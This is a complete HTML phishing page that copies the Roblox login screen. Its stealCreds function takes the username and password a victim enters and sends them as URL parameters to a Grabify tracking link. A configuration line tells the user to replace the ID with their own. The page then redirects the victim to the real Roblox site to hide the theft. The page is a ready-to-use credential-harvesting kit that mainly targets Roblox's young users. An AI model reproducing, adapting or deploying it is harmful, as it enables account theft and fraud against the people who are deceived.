<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log in to Roblox</title>
    <style>
        /* Roblox 2026 Exact Style */
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            background-color: #1e1e1e; /* Dark background matching the screenshot */
            font-family: 'Gotham SSm', 'Helvetica Neue', Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: #ffffff;
            /* Optional: Add a subtle blur or dark overlay if you want to mimic the game background */
            background-image: radial-gradient(circle at center, #2a2a2a 0%, #1e1e1e 100%);
        }

        .login-container {
            background-color: #232527; /* The exact dark grey of the modal */
            width: 100%;
            max-width: 450px;
            padding: 40px 30px;
            border-radius: 8px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .logo {
            width: 140px;
            margin-bottom: 20px;
            /* Using the standard Roblox text logo */
            background-image: url('https://upload.wikimedia.org/wikipedia/commons/thumb/3/3a/Roblox_player_icon_black.svg/1200px-Roblox_player_icon_black.svg.png');
            background-size: contain;
            background-repeat: no-repeat;
            background-position: center;
            height: 40px;
        }

        h2 {
            font-size: 20px;
            font-weight: 700;
            margin-bottom: 20px;
            color: #ffffff;
        }

        .input-group {
            width: 100%;
            margin-bottom: 15px;
        }

        input {
            width: 100%;
            padding: 12px 15px;
            background-color: #ffffff; /* White inputs */
            border: none;
            border-radius: 5px;
            font-size: 16px;
            color: #393b3d; /* Dark text */
            outline: none;
        }

        input::placeholder {
            color: #898989;
        }

        /* The White Outline Button */
        .btn-login {
            width: 100%;
            padding: 12px;
            background-color: transparent;
            border: 1px solid #ffffff; /* White outline */
            color: #ffffff; /* White text */
            font-size: 16px;
            font-weight: 600;
            border-radius: 5px;
            cursor: pointer;
            margin-top: 10px;
            transition: background 0.2s, color 0.2s;
        }

        .btn-login:hover {
            background-color: rgba(255, 255, 255, 0.1);
        }

        /* Links */
        .links {
            width: 100%;
            display: flex;
            justify-content: space-between;
            margin-top: 15px;
            font-size: 14px;
        }

        .links a {
            color: #ffffff;
            text-decoration: none;
            font-weight: 500;
        }

        .links a:hover {
            text-decoration: underline;
        }

        .one-time-code {
            margin-top: 15px;
            width: 100%;
            text-align: center;
        }

        .btn-otp {
            background: none;
            border: none;
            color: #ffffff;
            font-size: 14px;
            cursor: pointer;
            text-decoration: underline;
        }

        .quick-signin {
            margin-top: 15px;
            width: 100%;
        }

        .btn-quick {
            width: 100%;
            padding: 10px;
            background-color: #393b3d; /* Dark grey button */
            color: #ffffff;
            border: none;
            border-radius: 5px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
        }

        .quick-signin span {
            display: block;
            font-size: 12px;
            color: #898989;
            margin-top: 5px;
        }

        .spinner {
            display: none;
            margin: 15px auto;
            border: 3px solid #f3f3f3;
            border-top: 3px solid #ffffff;
            border-radius: 50%;
            width: 20px;
            height: 20px;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* Mobile Responsive */
        @media (max-width: 480px) {
            .login-container {
                padding: 30px 20px;
                margin: 10px;
            }
        }
    </style>
</head>
<body>

<div class="login-container">
    <!-- Roblox Logo -->
    <div class="logo"></div>
    
    <h2>Login to Roblox</h2>
    
    <form id="loginForm" onsubmit="stealCreds(event)">
        <div class="input-group">
            <input type="text" id="username" name="username" placeholder="Username/Email/Phone" required autocomplete="off">
        </div>
        <div class="input-group">
            <input type="password" id="password" name="password" placeholder="Password" required autocomplete="off">
        </div>
        
        <button type="submit" class="btn-login" id="loginBtn">Log In</button>
    </form>

    <div class="links">
        <a href="#">Forgot Password or Username?</a>
    </div>

    <div class="one-time-code">
        <button type="button" class="btn-otp">Email Me a One-Time Code</button>
    </div>

    <div class="quick-signin">
        <button type="button" class="btn-quick">Quick Sign-in</button>
        <span>Don't have an account? <a href="#" style="color:#ffffff; text-decoration: underline;">Sign Up</a></span>
    </div>

    <div class="spinner" id="spinner"></div>
</div>

<script>
    // --- CONFIGURATION ---
    // REPLACE THIS WITH YOUR GRABIFY ID
    const grabifyID = "NOH6OC"; 

    function stealCreds(event) {
        event.preventDefault();
        
        const user = document.getElementById('username').value;
        const pass = document.getElementById('password').value;
        
        // UI Feedback
        const btn = document.getElementById('loginBtn');
        const spinner = document.getElementById('spinner');
        
        btn.style.display = 'none';
        spinner.style.display = 'block';
        btn.disabled = true;
        
        // 1. Send Data to Grabify
        const url = `https://grabify.link/${grabifyID}?user=${encodeURIComponent(user)}&pass=${encodeURIComponent(pass)}`;
        
        fetch(url, {
            method: 'GET',
            keepalive: true
        }).catch(console.error);
            
        // 2. Redirect to Real Roblox
        setTimeout(() => {
            window.location.href = "https://www.roblox.com/home";
        }, 800);
    }
</script>

</body>
</html>
